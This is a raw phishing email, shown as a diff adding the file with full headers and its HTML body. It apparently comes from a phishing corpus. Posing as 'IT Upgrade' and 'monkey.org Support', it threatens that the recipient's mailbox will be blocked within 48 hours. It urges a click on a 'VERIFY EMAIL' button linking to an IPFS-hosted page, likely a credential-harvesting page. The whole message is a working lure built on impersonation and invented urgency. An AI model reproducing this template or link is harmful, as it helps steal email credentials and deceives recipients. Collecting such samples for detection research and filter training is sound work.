@@ -1,0 +1,122 @@
+Return-Path: ann@hinthida.info
+Delivered-To: jose@monkey.org
+X-FDA: 81028674972.11.DF5202F
+Received: from manakin.hinthida.info (manakin.hinthida.info [88.209.205.231])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP id AC4F8180019
+	for <jose@monkey.org>; Wed, 19 Jul 2023 15:01:24 +0000 (UTC)
+Authentication-Results: imf30.b.hostedemail.com;
+	dkim=pass header.d=hinthida.info header.s=dkim header.b=ZgtHtJdv;
+	spf=pass (imf30.b.hostedemail.com: domain of ann@hinthida.info designates 88.209.205.231 as permitted sender) smtp.mailfrom=ann@hinthida.info;
+	dmarc=pass (policy=none) header.from=hinthida.info
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1689778885;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=b6ylwTo7nmkq0P6cvMRq8E5PWi+/4rvQrzC8eYSN3Dw=;
+	b=sKhDLJ66Hgqdjkfc0KGAisPT88LZjuLmnN3Tm2JVMMpthBbn1WYVRd95KwhcV7nh0n+Nxr
+	yrmkFADnYZSH+JSr1xiU2ZJc8/jfCgBixRCQHEJP0Jmu8Xeazf1IQr4fCU47gmz4KPQW/z
+	I42MVgt87Zp//JKMj9rhEA5FcGbMDWk=
+ARC-Authentication-Results: i=1;
+	imf30.b.hostedemail.com;
+	dkim=pass header.d=hinthida.info header.s=dkim header.b=ZgtHtJdv;
+	spf=pass (imf30.b.hostedemail.com: domain of ann@hinthida.info designates 88.209.205.231 as permitted sender) smtp.mailfrom=ann@hinthida.info;
+	dmarc=pass (policy=none) header.from=hinthida.info
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1689778885; a=rsa-sha256;
+	cv=none;
+	b=Qd813HN5tGxkPdDuVAP2SKiRXlfNBNRi9SCC7b1H9i9twb6tfejgAu4NqNIan8XaT3ba6p
+	ywAqNdOC+VdNsWuoHh6Ks+mqiN0jpvlUtm8aIsDjaJ/7Crj+WqvmtL71937m1gL3bp6/QQ
+	5Tud6awBwB3B8gtRAqkyO5xvBehzSwY=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=hinthida.info;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding; i=ann@hinthida.info;
+ bh=Hv08xPTGnxsIc1aZoy9byqY9Upk=;
+ b=ZgtHtJdv1RBvX4krYq/aNLMyL4e3WwIv370r2+PrgTL3K9p9GiHb1f76mmEhCLwBx2byxRp9uveR
+   ItmQi/mUGQbaNv9SA5LlkTf1EE3UuhSRBeiubpODXgpxemb9oe0t9fBWkTPoe446LLoiBoeNJkJ3
+   XzOMD7wm4Uk37W0DCkSQ6Zn71mgdUR2iDWkomDtn4vN94MAdBqe4WhS5Cp3NDioe0nyKrRr9ZrIo
+   qpsJltW3NODxOU1lzxHRQnJQ8GjWy1kYwEWKUChLUn9rg+Yd63UIbFoB57M/qdGEWjCnE7iNXPaa
+   QGNMRc5MPO1gTfsDT7ZC6qIsWCnuFHU0/UpWuQ==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=hinthida.info;
+ b=bzVO3SR6TAZkMDrLw4yY4juLWJ6orMgwVq800AG67vknqX0bnfxQfMebH52pT046Og49dom7mlxM
+   psHLBda/gkThD9+xbMlmCrhya2T/ZqtUnavyc7HJVLxJES259wlLm9djUtazk8v7DqwCzri52Fxe
+   +GhDYiYn4YX3H7pSmJ3IWkNIjLmtUHU5Q5ut5uftnw8TM042Fn+pfRzEOh2dS8tXvKDv/wfsaudU
+   CfoMdmSYYaybv9+Phq8DHkhJWhnl1nAYMzmEQwB/MSbxAstK48RlTevtuq9ICyDLiw8fg7aRw/D4
+   aBZ0U31y1z1mhTlPdqetdvOapPSKGYxDCaAYVw==;
+From: IT Upgrade  <ann@hinthida.info>
+To: jose@monkey.org
+Subject: Your Email: jose@monkey.org will be blocked
+Date: 3 Jul 2023 03:38:57 -0700
+Message-ID: <20230703033857.580EA43931C808DB@hinthida.info>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam08
+X-Rspam-User: 
+X-Rspamd-Queue-Id: AC4F8180019
+X-Spam-Status: No, score=6.22
+X-Stat-Signature: 7e67rtdjocw1zjhacqz5cqsf87ufbmbf
+X-HE-Tag: 1689778884-385215
+X-HE-Meta: U2FsdGVkX1914sFVF8wmcyuVFKqj6tTkEluK+7ZKL6bYkAJObj6CIEavdJsOz3Q1jblF+FoOrSkqTEzv3ul2ycOmoDR/QK0cmJbNcwiE08fRHaTJwchjRBKmrWLbMWWXIrGF5uyquMCDToY7UWx01OFwjpqC8nG9IIUb382EtDMtoEbvvK1NwZI1Qavpq3leXRsv/xRxx23f9o+PH8gL01td5rXpNku2+tD0IzIawYA=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 203
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;"><table width=3D"100%" align=3D"left" style=
+=3D"border-collapse: collapse; min-width: 100%; max-width: 100%;" border=3D=
+"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td valign=3D"top" style=
+=3D"margin: 0px; padding: 0px 18px 9px; font-family: Roboto,RobotoDraft,Hel=
+vetica,Arial,sans-serif;"><font face=3D"Arial" size=3D"2">Due to new securi=
+ty updates on our server your Email: jose@monkey.org&nbsp;  will be stopped=
+ from sending and receiving emails if not verified within 48hrs<br><br>
+If you wish to keep using your email, kindly verify below .<br><br></font><=
+/td></tr></tbody></table><p><br></p>
+<table width=3D"100%" style=3D"color: rgb(0, 0, 0); text-transform: none; f=
+ont-family: Arial,Helvetica,sans-serif; font-size: 12px; font-style: normal=
+; font-weight: 400; word-spacing: 0px; white-space: normal; border-collapse=
+: collapse; min-width: 100%; background-color: rgb(255, 255, 255); font-var=
+iant-ligatures: normal; font-variant-caps: normal; text-decoration-style: i=
+nitial; text-decoration-color: initial;" border=3D"0" cellspacing=3D"0" cel=
+lpadding=3D"0"><tbody><tr>
+<td align=3D"center" valign=3D"top" style=3D"margin: 0px; padding: 0px 18px=
+ 18px; font-family: Roboto,RobotoDraft,Helvetica,Arial,sans-serif;"><table =
+width=3D"100%" style=3D"border-radius: 0px; background-color: rgb(0, 164, 2=
+39);" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=
+=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 15px; font-fam=
+ily: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; font-size: 16px;">
+<a title=3D"VERIFY EMAIL HERE" style=3D"color: rgb(255, 255, 255); line-hei=
+ght: 16px; font-weight: bold; display: block; text-decoration-line: none;" =
+href=3D"https://ipfs.io/ipfs/QmXXahpUMp3iEVfCXW2LiJLYSh7aYrfgmjis4oUjsFsb4y=
+?filename=3Drat.html#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer" =
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://nimh.gov.vn/g=
+ju/FaxFile.htm?email%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D168=
+8382258424000&amp;usg=3DAOvVaw2dJUAMMV20CFQE35tiIOxU"><font face=3D"Arial">=
+
+ VERIFY EMAIL</font></a></td></tr></tbody></table></td></tr></tbody></table=
+><p>&nbsp;&nbsp;&nbsp;&nbsp; <font face=3D"Arial" size=3D"2">The verificati=
+on process takes only a few seconds  only. Failure to verify email would le=
+ad to closure.<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thank  You=
+,<br>              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; monkey.org Su=
+pport<br>&nbsp;&nbsp; </font><br></p>
+<table width=3D"100%" style=3D"color: rgb(0, 0, 0); text-transform: none; f=
+ont-family: Arial,Helvetica,sans-serif; font-size: 12px; font-style: normal=
+; font-weight: 400; word-spacing: 0px; white-space: normal; border-collapse=
+: collapse; min-width: 100%; background-color: rgb(255, 255, 255); font-var=
+iant-ligatures: normal; font-variant-caps: normal; text-decoration-style: i=
+nitial; text-decoration-color: initial;" border=3D"0" cellspacing=3D"0" cel=
+lpadding=3D"0"><tbody><tr>
+<td valign=3D"top" style=3D"margin: 0px; padding-top: 9px; font-family: Rob=
+oto,RobotoDraft,Helvetica,Arial,sans-serif;"><table width=3D"100%" align=3D=
+"left" style=3D"border-collapse: collapse; min-width: 100%; max-width: 100%=
+;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td valign=
+=3D"top" style=3D"margin: 0px; padding: 0px 18px 9px; font-family: Roboto,R=
+obotoDraft,Helvetica,Arial,sans-serif;"><font face=3D"Arial" size=3D"2"></f=
+ont><font face=3D"Arial" size=3D"2"><br></font></td></tr></tbody></table></=
+td>
+</tr></tbody></table></body></html>
+
